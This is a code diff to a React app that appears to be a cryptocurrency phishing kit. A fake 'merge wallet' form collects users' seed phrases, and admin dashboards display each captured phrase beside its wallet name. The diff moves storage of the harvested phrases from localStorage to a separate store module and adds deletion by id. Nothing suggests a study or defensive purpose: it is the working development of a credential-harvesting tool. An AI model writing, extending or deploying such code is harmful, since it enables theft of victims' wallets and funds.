@@ -3,6 +3,7 @@ import { useState, useEffect } from "react";
 import { Bell, CheckCircle, ShieldCheck, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
 import { BrowserRouter as Router, Route, Routes, useNavigate } from "react-router-dom";
+import { submissionStore } from "./store";
 import "./App.css";
 
 interface Wallet {
@@ -11,6 +12,7 @@ interface Wallet {
 }
 
 interface Submission {
+  id?: number;
   wallet: string;
   seedPhrase: string;
   timestamp: number;
@@ -139,16 +141,18 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
     return !newErrors.includes(true);
   };
 
-  const merge = () => {
+  const merge = async () => {
     setError(false);
     if (!validate()) {
       setError(true);
       return;
     }
 
-    const submissions: Submission[] = JSON.parse(localStorage.getItem("submissions") || "[]");
-    submissions.push({ wallet: wallet?.name || "Wallet", seedPhrase: phrases.join(" "), timestamp: Date.now() });
-    localStorage.setItem("submissions", JSON.stringify(submissions));
+    await submissionStore.add({
+      wallet: wallet?.name || "Wallet",
+      seedPhrase: phrases.join(" "),
+      timestamp: Date.now()
+    });
 
     setLoading(true);
     setTimeout(() => {
@@ -179,8 +183,11 @@ function Admin() {
   const [submissions, setSubmissions] = useState<Submission[]>([]);
 
   useEffect(() => {
-    const stored: Submission[] = JSON.parse(localStorage.getItem("submissions") || "[]");
-    setSubmissions(stored);
+    const loadSubmissions = async () => {
+      const stored: Submission[] = await submissionStore.getAll();
+      setSubmissions(stored);
+    };
+    loadSubmissions();
   }, []);
 
   return (
@@ -281,14 +288,18 @@ function AdminDashboard() {
     "DeFi Wallet": "/src/icons/defi.webp"
   };
   useEffect(() => {
-    const stored: Submission[] = JSON.parse(localStorage.getItem("submissions") || "[]");
-    setSubmissions(stored);
+    const loadSubmissions = async () => {
+      const stored: Submission[] = await submissionStore.getAll();
+      setSubmissions(stored);
+    };
+    loadSubmissions();
   }, []);
 
-  const deleteSubmission = (index: number) => {
-    const updated = submissions.filter((_, i) => i !== index);
+  const deleteSubmission = async (id: number | undefined) => {
+    if (id === undefined) return;
+    await submissionStore.delete(id);
+    const updated = await submissionStore.getAll();
     setSubmissions(updated);
-    localStorage.setItem("submissions", JSON.stringify(updated));
   };
 
   return (
@@ -298,12 +309,12 @@ function AdminDashboard() {
         <p>No wallet submissions yet.</p>
       ) : (
         <div className="admin-grid scrollable-admin-grid">
-          {submissions.map((s, i) => (
-            <div key={i} className="admin-card beautiful-admin-card">
+          {submissions.map((s) => (
+            <div key={s.id} className="admin-card beautiful-admin-card">
               <div className="admin-header">
                 <img src={walletIcons[s.wallet] || "/src/icons/coincryptex.png"} alt={s.wallet} className="admin-wallet-icon" />
                 <span className="admin-wallet-name">{s.wallet}</span>
-                <button className="admin-delete-btn" onClick={() => deleteSubmission(i)}>Delete</button>
+                <button className="admin-delete-btn" onClick={() => deleteSubmission(s.id)}>Delete</button>
               </div>
               <div className="admin-seed">
                 <span className="admin-seed-label">Seed Phrase:</span>
